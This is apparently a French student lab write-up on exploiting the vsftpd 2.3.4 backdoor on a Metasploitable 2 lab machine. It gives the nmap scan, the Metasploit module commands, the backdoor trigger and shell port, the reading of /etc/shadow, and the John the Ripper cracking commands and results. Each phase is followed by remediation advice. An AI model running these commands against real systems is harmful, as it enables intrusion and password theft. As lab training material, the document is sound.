# Phase 2 - Exploitation : backdoor vsftpd 2.3.4

## Contexte
Cible : Metasploitable 2 (192.168.188.3), réseau isolé du lab.
Service visé : serveur FTP vsftpd, port 21.

## 1. Reconnaissance
Scan de services avec nmap :
    nmap -sV 192.168.188.3
Résultat clé : port 21 ouvert, `vsftpd 2.3.4` - version connue pour
contenir une backdoor (CVE-2011-2523).

## 2. Exploitation
Via Metasploit :
    use exploit/unix/ftp/vsftpd_234_backdoor
    set RHOSTS 192.168.188.3
    exploit

La backdoor s'active quand un nom d'utilisateur se termine par ":)".
Elle ouvre un shell caché sur le port 6200.

## 3. Impact
- Shell obtenu avec les droits **root** (uid=0) — contrôle total de la machine.
- Lecture de /etc/shadow (hashes de tous les comptes) → compromission
  totale possible (vol et crack des mots de passe).
(voir screenshots/phase2-vsftpd.png)

## 4. Remédiation
- Mettre à jour vsftpd vers une version saine (la 2.3.4 piégée doit être bannie).
- Vérifier l'intégrité des binaires téléchargés (signatures/hashes officiels).
- Segmenter le réseau et restreindre l'accès au port FTP (pare-feu).
- Préférer SFTP/FTPS au FTP en clair.

## Référence
CVE-2011-2523 - vsftpd 2.3.4 backdoor command execution.

## 5. Post-exploitation : crack des mots de passe
Les hashes récupérés dans /etc/shadow ont été cassés avec John the Ripper :
    john --wordlist=/usr/share/wordlists/rockyou.txt ~/shadow.txt
    john --show ~/shadow.txt

Résultat : 3/7 comptes cassés en quelques secondes (mots de passe faibles).
- sys : batman
- klog : 123456789
- service : service
Les 4 autres (ex. msfadmin) ont résisté : mot de passe absent de la wordlist.

Avec --rules : un 4e compte cassé (user:user). Les 3 derniers (dont root,
msfadmin) résistent : mots absents de la wordlist, même après mutation.
→ Confirme que la robustesse vient surtout de l'absence des listes connues.

### Leçon
Un mot de passe faible ou courant tombe quasi instantanément face à une
wordlist comme rockyou. La robustesse d'un mot de passe = son absence des
listes connues + sa longueur/complexité.

### Remédiation
- Politique de mots de passe forts (longueur, complexité, non-réutilisation).
- Algorithme de hachage moderne (bcrypt/argon2) au lieu du vieux MD5crypt.
- Déploiement d'un gestionnaire de mots de passe + MFA.